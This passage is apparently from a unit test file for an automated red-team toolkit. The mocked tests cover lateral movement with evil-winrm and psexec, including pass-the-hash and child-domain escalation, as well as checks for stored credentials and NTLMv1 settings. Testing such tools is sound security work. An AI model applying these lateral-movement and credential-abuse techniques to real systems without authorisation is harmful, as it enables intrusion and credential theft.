        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Trust not found")
            result = tools.raise_child(
                "child.test.local",
                "administrator",
                "pass",  # pragma: allowlist secret
            )

        assert "failed" in result.lower()


class TestLateralMovementTools:
    """Tests for LateralMovementTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import LateralMovementTools

        tools = LateralMovementTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import LateralMovementTools

        tools = LateralMovementTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_evil_winrm_with_password(self, red_team_state: RedTeamState):
        """Test evil-winrm with password authentication."""
        from ares.tools.red.network import LateralMovementTools

        tools = LateralMovementTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="test\\administrator\nDC01\n", return_code=0
            )
            result = tools.evil_winrm(
                "192.168.56.10",
                "administrator",
                password="pass",  # pragma: allowlist secret
            )

        assert "administrator" in result.lower()

    def test_evil_winrm_with_hash(self, red_team_state: RedTeamState):
        """Test evil-winrm with pass-the-hash."""
        from ares.tools.red.network import LateralMovementTools

        tools = LateralMovementTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="nt authority\\system", return_code=0)
            result = tools.evil_winrm(
                "192.168.56.10",
                "administrator",
                hash="aad3b435b51404eeaad3b435b51404ee",  # pragma: allowlist secret
            )

        assert "system" in result.lower()

    def test_evil_winrm_no_creds(self, red_team_state: RedTeamState):
        """Test evil-winrm without credentials fails gracefully."""
        from ares.tools.red.network import LateralMovementTools

        tools = LateralMovementTools()
        tools.set_state(red_team_state)

        result = tools.evil_winrm("192.168.56.10", "administrator")

        assert "error" in result.lower()

    def test_evil_winrm_exception(self, red_team_state: RedTeamState):
        """Test evil-winrm exception handling."""
        from ares.tools.red.network import LateralMovementTools

        tools = LateralMovementTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("WinRM disabled")
            result = tools.evil_winrm(
                "192.168.56.10",
                "administrator",
                password="pass",  # pragma: allowlist secret
            )

        assert "failed" in result.lower()

    def test_psexec_with_password(self, red_team_state: RedTeamState):
        """Test psexec with password authentication."""
        from ares.tools.red.network import LateralMovementTools

        tools = LateralMovementTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="nt authority\\system", return_code=0)
            result = tools.psexec(
                "192.168.56.10",
                "administrator",
                password="pass",  # pragma: allowlist secret
                domain="test.local",
                command="whoami",
            )

        assert "system" in result.lower()

    def test_psexec_with_hash(self, red_team_state: RedTeamState):
        """Test psexec with pass-the-hash."""
        from ares.tools.red.network import LateralMovementTools

        tools = LateralMovementTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="C:\\Windows>", return_code=0)
            result = tools.psexec(
                "192.168.56.10",
                "administrator",
                hash="aad3b435b51404eeaad3b435b51404ee",  # pragma: allowlist secret
            )

        assert "windows" in result.lower()

    def test_psexec_exception(self, red_team_state: RedTeamState):
        """Test psexec exception handling."""
        from ares.tools.red.network import LateralMovementTools

        tools = LateralMovementTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("SMB blocked")
            result = tools.psexec(
                "192.168.56.10",
                "administrator",
                password="pass",  # pragma: allowlist secret
            )

        assert "failed" in result.lower()


class TestPostureValidationTools:
    """Tests for PostureValidationTools."""

    def test_check_credman_entries_adds_weakness(self, red_team_state: RedTeamState):
        """Credential Manager entries should be tracked as weaknesses."""
        from ares.tools.red.network import PostureValidationTools

        tools = PostureValidationTools()
        tools.set_state(red_team_state)

        output = "Target: LegacyGeneric:target=TERMSRV/host\n"
        with patch.object(tools, "_run_netexec_command", return_value=output):
            result = tools.check_credman_entries(
                target="192.168.56.10",
                username="admin",
                password="pass",  # pragma: allowlist secret
                domain="TEST",
            )

        assert "Credential Manager entries found" in result
        assert any("Credential Manager Entries" in block for block in red_team_state.weaknesses)

    def test_check_autologon_registry_adds_weakness(self, red_team_state: RedTeamState):
        """Autologon registry credentials should be flagged."""
        from ares.tools.red.network import PostureValidationTools

        tools = PostureValidationTools()
        tools.set_state(red_team_state)

        output = (
            "AutoAdminLogon    REG_SZ    1\n"
            "DefaultUserName    REG_SZ    TEST\\svc\n"
            "DefaultPassword    REG_SZ    Secret123\n"
        )
        with patch.object(tools, "_run_netexec_command", return_value=output):
            result = tools.check_autologon_registry(
                target="192.168.56.10",
                username="admin",
                password="pass",  # pragma: allowlist secret
                domain="TEST",
            )

        assert "Autologon credentials detected" in result
        assert any("Autologon Credentials" in block for block in red_team_state.weaknesses)

    def test_check_lm_compatibility_level_adds_weakness(self, red_team_state: RedTeamState):
        """LmCompatibilityLevel allowing NTLMv1 should be recorded."""
        from ares.tools.red.network import PostureValidationTools

        tools = PostureValidationTools()
        tools.set_state(red_team_state)

        output = "LmCompatibilityLevel    REG_DWORD    0x2\n"
        with patch.object(tools, "_run_netexec_command", return_value=output):
            result = tools.check_lm_compatibility_level(
                target="192.168.56.10",
                username="admin",
                password="pass",  # pragma: allowlist secret
                domain="TEST",
            )

        assert "NTLMv1 allowed" in result
        assert any("NTLMv1 Downgrade Allowed" in block for block in red_team_state.weaknesses)
